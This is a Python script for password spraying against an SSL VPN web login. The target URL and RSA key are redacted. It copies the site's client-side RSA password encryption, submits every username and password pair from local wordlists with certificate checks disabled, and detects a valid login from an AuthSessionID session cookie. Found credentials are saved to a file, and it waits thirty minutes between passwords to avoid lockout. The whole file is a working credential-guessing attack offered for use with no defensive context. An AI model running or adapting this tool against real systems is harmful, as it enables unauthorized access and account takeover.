#!/usr/bin/python

import sys
import os
from Crypto.PublicKey  import RSA
import requests
import time
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

#Disabling HTTPS certificate verification
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#User Args
url="hxxps://xxxxx.com/Login/Login"
Headers={"Content-Type": "application/x-www-form-urlencoded"}
Cookies={"CheckCookieSupport":"1","_ga":"xxxx","_fbp":"xxxx","_gcl_au":"xxxx","selected_realm":"ssl_vpn","_gid":"xxxx"}
timer=1800

if sys.version_info >= (3,) :
    def b_ord (x) :
        return x
else :
    def b_ord (x) :
        return ord (x)

def iterbytes (x) :
    if sys.version_info >= (3,) :
        x = bytes (x)
    else :
        x = b''.join (x)
    for i in range (len (x)) :
        yield (x [i:i+1])
# end def iterbytes

def pubkey(password) :
    # Exponent (e) and Modulus (m) are stored within the JavaScript file JS_RSA.JS (var modulus / var exponent)
    e = int(b'xxxxxx', 16)
    m = int('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',16)
    pubkey  = RSA.construct((m, e))
    passpass = encrypt(password,pubkey)
    return passpass

def pad(password, pubkey) :
    l = (pubkey.size()+7)>>3
    r = []
    r.append(b'\0')

    for x in iterbytes(reversed (password.encode('utf-8'))):
        r.append(x)
    r.append(b'\0')
    n = l - len(r) - 2
    
    r.append (os.urandom (n))
    r.append (b'\x02')
    r.append (b'\x00')

    return b''.join (reversed (r))
    # end def pad

def encrypt(password,pubkey) :
    x = pad(password,pubkey)
    e = pubkey.encrypt(x,'')[0]
    e = ''.join ('%02x' % b_ord(c) for c in reversed(e))
    return e

while True:
    passfile = open("./passwords.txt","r")

    for password in passfile:
        passwd = (password.strip("\n"))
        print("\n########### Starting with password : "+passwd+" ###########\n")
        userfile = open("./users.txt", "r")
        
        for user in userfile:    
            encryptedpass = pubkey(passwd)
            username = (user.strip("\n"))
            
            data = {"selectedReal": "ssl_vpn", "loginType": "Standard", "userName": username,"password": encryptedpass}
            req = requests.post(url, data=data, headers=Headers, cookies=Cookies, verify=False, allow_redirects=False)
            
            print("--- Username : "+username+" : "+passwd)

            if req.cookies.get('AuthSessionID'):
                print("+++++++++ Found valid credentials: "+ username + " : " + passwd + " +++++++++")
                result = open("./credentials.txt", "a")
                result.write(username+":"+passwd)
                result.close()

            else:
                continue
        
        print("Sleeping after password : " + passwd)
        
        time.sleep(timer)
    
    userfile.close()
    passfile.close()
